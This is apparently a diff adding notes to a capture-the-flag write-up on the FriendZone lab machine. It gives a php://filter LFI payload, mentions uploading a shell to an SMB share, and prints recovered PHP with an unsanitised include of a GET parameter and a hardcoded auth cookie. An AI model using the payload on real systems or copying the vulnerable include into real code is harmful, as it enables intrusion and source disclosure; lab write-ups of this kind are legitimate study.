@@ -97,6 +97,39 @@
 * Maybe I have to change my time zone to another one so that I can get something?  
 * If I use one of these usernames `Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none` supposing they're coming from the server and not from the tool itself, I might be able to get more info than running `enum4linux` with a blank username and password. These usernames seem to be from the tool itself.
 * I can `put` a file in the share `Development` as admin. This will allow me to upload a shell. What is left would be to access this shell and execute it.
+* I found an LFI in the `pagename` parameter but only when using PHP Wrappers I used this line of code `pagename=php://filter/convert.base64-encode/resource=dashboard` which returns the code of the php page I provide to it and thus, I used it to check dashboard's (the current page's code to see how to deal with the parameters). I got this code   
+```php
+<?php
+
+//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
+//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
+echo "<title>FriendZone Admin !</title>";
+$auth = $_COOKIE["FriendZoneAuth"];
+
+if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
+ echo "<br><br><br>";
+
+echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
+echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
+
+if(!isset($_GET["image_id"])){
+  echo "<br><br>";
+  echo "<center><p>image_name param is missed !</p></center>";
+  echo "<center><p>please enter it to show the image</p></center>";
+  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
+ }else{
+ $image = $_GET["image_id"];
+ echo "<center><img src='images/$image'></center>";
+
+ echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
+ include($_GET["pagename"].".php");
+ //echo $_GET["pagename"];
+ }
+}else{
+echo "<center><p>You can't see the content ! , please login !</center></p>";
+}
+?>
+```
 <br/><br/>  
 
 
